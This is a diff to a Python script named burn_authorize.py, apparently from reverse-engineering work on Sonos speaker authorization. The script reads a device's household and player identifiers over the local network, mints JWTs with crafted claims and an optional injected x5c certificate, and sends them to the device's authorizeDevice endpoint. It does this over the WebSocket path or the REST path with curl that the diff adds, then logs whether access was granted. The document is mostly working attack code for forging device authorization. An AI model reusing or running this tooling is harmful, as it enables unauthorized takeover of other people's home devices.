@@ -14,8 +14,14 @@ Facts this harness encodes (all proven, docs/RE_TOKEN.md 2026-11-03 (e)):
 composed value is device state, so the shapes carry composed fingerprints built
 from the household's own broadcast identifiers.
 
+The same handler answers over REST (`POST /api/v1/players/<playerId>/authorization/
+authorizeDevice`, bearer in the HTTP `Authorization` header) — identical one-bit
+verdict, no WS accept queue. MODE=rest (default) is the robust path; MODE=ws
+exercises the commander framing.
+
 usage: burn_authorize.py <ip>
        KIT_DIR=<dir with mint_jwt.py + keys>  SRC_IP=<bind address>  OUT=<jsonl log>
+       MODE=ws
 """
 import base64, json, os, socket, ssl, struct, subprocess, sys, time
 
@@ -70,9 +76,12 @@ def info(ip):
             "serial": tag("SerialNumber"), "info": ssdp_infohash(ip)}
 
 
-def mint(claims):
+def mint(claims, x5c0=None):
+    env = dict(os.environ)
+    if x5c0:
+        env["X5C0"] = x5c0
     return subprocess.run([sys.executable, D + "/mint_jwt.py", json.dumps(claims)],
-                          capture_output=True, text=True, check=True).stdout.strip()
+                          capture_output=True, text=True, check=True, env=env).stdout.strip()
 
 
 def connect(ip, timeout=15):
@@ -143,6 +152,14 @@ def recv_text(s, timeout=6):
             return out.decode("utf8", "replace")
 
 
+def burn_rest(ip, player, hh, jwt, n):
+    body = json.dumps({"grantType": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": jwt})
+    cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST", "-H", "X-Sonos-Api-Key: " + KEY,
+           "-H", "Content-Type: application/json", "-H", "Authorization: Bearer " + jwt,
+           "-d", body, "https://%s:1443/api/v1/players/%s/authorization/authorizeDevice" % (ip, player)]
+    return subprocess.run(cmd, capture_output=True, text=True).stdout
+
+
 def main(ip):
     e = info(ip)
     hl = e["hh"].split(".")[1].split("_")[0]          # household luid (mhhid middle segment)
@@ -165,31 +182,36 @@ def main(ip):
     for n, (label, iss, systemId, jti) in enumerate(shapes, 1):
         now = int(time.time())
         jwt = mint({"iss": iss, "systemId": systemId, "scp": SCP, "iat": now, "exp": now + 86400,
-                    "riat": now, "rexp": now + 86400, "jti": jti, "sub": "probe", "aud": "Sonos"})
-        s = None
-        for _ in range(4):
-            try:
-                s = connect(ip)
-                break
-            except Exception as ex:
-                err = ex
-                time.sleep(1.5)
-        if s is None:
-            print("CONNECT_ERR", label, err)
-            continue
-        hdr = {"namespace": "authorization", "command": "authorizeDevice", "playerId": e["luid"],
-               "householdId": e["hh"], "cmdId": n, "authorization": "Bearer " + jwt}
-        body = {"grantType": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": jwt,
-                "objectId": e["luid"], "objectType": "player"}
-        out = ""
-        try:
-            send(s, json.dumps([hdr, body]))
-            for _ in range(8):
-                out += recv_text(s, 8)
-                if "errorCode" in out or '"success":true' in out:
+                    "riat": now, "rexp": now + 86400, "jti": jti, "sub": "probe", "aud": "Sonos"},
+                   os.environ.get("X5C0"))
+        if os.environ.get("MODE", "rest") == "rest":
+            out = burn_rest(ip, e["luid"], e["hh"], jwt, n)
+            s = None
+        else:
+            s = None
+            for _ in range(4):
+                try:
+                    s = connect(ip)
                     break
-        except Exception as ex:
-            out += " ERR %s" % ex
+                except Exception as ex:
+                    err = ex
+                    time.sleep(1.5)
+            if s is None:
+                print("CONNECT_ERR", label, err)
+                continue
+            hdr = {"namespace": "authorization", "command": "authorizeDevice", "playerId": e["luid"],
+                   "householdId": e["hh"], "cmdId": n, "authorization": "Bearer " + jwt}
+            body = {"grantType": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": jwt,
+                    "objectId": e["luid"], "objectType": "player"}
+            out = ""
+            try:
+                send(s, json.dumps([hdr, body]))
+                for _ in range(8):
+                    out += recv_text(s, 8)
+                    if "errorCode" in out or '"success":true' in out:
+                        break
+            except Exception as ex:
+                out += " ERR %s" % ex
         i = out.find("errorCode")
         verdict = ("GRANT?" if "errorCode" not in out else
                    "RESOLVER_DOWN" if "Could not resolve" in out else "401")
